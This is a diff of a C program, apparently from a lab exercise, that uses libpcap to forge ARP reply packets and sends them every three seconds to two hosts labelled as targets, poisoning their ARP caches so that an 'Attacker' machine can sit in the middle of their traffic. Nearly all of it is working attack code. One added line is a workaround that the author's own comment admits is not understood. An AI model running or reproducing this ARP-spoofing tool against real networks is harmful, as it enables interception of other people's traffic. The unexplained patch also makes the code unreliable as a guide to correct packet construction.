@@ -260,9 +260,11 @@ int main(int argc, char *argv[]){
 
     printf("----SEND ARP----\n");
     while(1){
-    _send_arp(dev_str,pair_mac1_bytes,_mymac,_mymac,ip_str2_bytes,pair_mac1_bytes,ip_str1_bytes,0x0002);
-	_send_arp(dev_str,pair_mac2_bytes,_mymac,_mymac,ip_str1_bytes,pair_mac2_bytes,ip_str2_bytes,0x0002);    
-	sleep(3);
+	    printf("Target A");
+	    _send_arp(dev_str,pair_mac1_bytes,_mymac,_mymac,ip_str2_bytes,pair_mac1_bytes,ip_str1_bytes,0x0002);
+		printf("Target B");
+		_send_arp(dev_str,pair_mac2_bytes,_mymac,_mymac,ip_str1_bytes,pair_mac2_bytes,ip_str2_bytes,0x0002);    
+		sleep(3);
 }
 /*
 	int m;
@@ -445,7 +447,7 @@ u_char* _ip_string_to_bytes(u_char *ip_str){
 	return  _ip;
 }
 void _send_arp(u_char *dev_str,u_char *dst_mac,u_char *src_mac,u_char *sender_mac,u_char *sender_ip,u_char *target_mac,u_char *target_ip,u_short _opcode){
-	u_char s_arp[43]={               
+	static u_char s_arp[43]={               
 		/* 						ETHER PACKET    				       			 */
 		0xff,0xff,0xff,0xff,0xff,0xff,   /*Destination Mac : Target(VM_win10)    */ 
 		0x00,0x0c,0x29,0x2e,0x16,0xe4,   /*Source Mac      : Attacker(VM_Ubuntu) */
@@ -455,7 +457,7 @@ void _send_arp(u_char *dev_str,u_char *dst_mac,u_char *src_mac,u_char *sender_ma
 		0x08, 0x00,						 /*Protocol Type 						 */
 		0x06,					         /*Hardware Size, Length      			 */ 
 		0x04,					         /*Protocol Size			  			 */
-/*20*/	0x00, 0x02,				         /*Opcode, 2 is replay        			 */
+/*20*/	0x00,0x02,				         /*Opcode, 2 is replay        			 */
 		0x00,0x0c,0x29,0x2e,0x16,0xe4,   /*Sender MAC      : Attacker(VM_Ubuntu) */
 		0xc0,0xa8,0xf6,0x02,		     /*Sender IP (GW IP)		 			 */
 		0x00,0x00,0x00,0x00,0x00,0x00,   /*Target MAC      : Target(VM_win10)    */
@@ -470,12 +472,14 @@ void _send_arp(u_char *dev_str,u_char *dst_mac,u_char *src_mac,u_char *sender_ma
 		s_arp[i+28]=sender_ip[i];
 		s_arp[i+32]=target_mac[i];
 		s_arp[i+38]=target_ip[i];
-	}
-	printf("S_ARP ALL");
+	} s_arp[33]=target_mac[1];  //  i can't understand here. but if didn't do this.  something going wrong
+
+
 	for(int i=0; i<42; i++){
 		if(i%16==0) printf("\n");
 		printf("[%02x]",s_arp[i]);
 	} printf("\n");
+
 
 	pcap_t *s_handle;
 	u_char *s_packet;
@@ -495,8 +499,8 @@ void _send_arp(u_char *dev_str,u_char *dst_mac,u_char *src_mac,u_char *sender_ma
 	printf("-----------------------------------\n");	
 	int t=0;
 	pcap_sendpacket(s_handle, s_arp, 43);
-
 }
+
 
 u_char* _detecpair_mac1_bytes(u_char *dev_str,u_char *chk_ip){
 	pcap_t *handle;
